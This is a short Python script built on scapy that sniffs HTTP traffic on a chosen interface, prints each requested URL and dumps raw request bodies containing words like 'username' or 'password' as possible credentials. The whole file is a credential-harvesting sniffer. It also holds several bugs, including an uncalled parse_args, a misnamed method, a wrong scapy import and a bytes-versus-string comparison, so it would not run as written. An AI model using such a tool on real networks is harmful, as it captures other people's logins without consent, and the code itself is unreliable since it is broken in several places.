import scapy
from scapy.layers import http
import argparse

def get_arguments():
    parser =  argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Specify the network interface")
    options = parser.parse_args
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets, filter="")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path 

def get_login_info(packet):
    if packet.hasLayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "password", "user", "pass", "login"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packets(packet):
    if packet.hasLayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTPRequest >>" + url)
        
        login_info = get_login_info(packet)
        print("\n\nPossible username/password >>" + login_info + "\n\n")
        
options = get_arguments()
sniff(options.interface)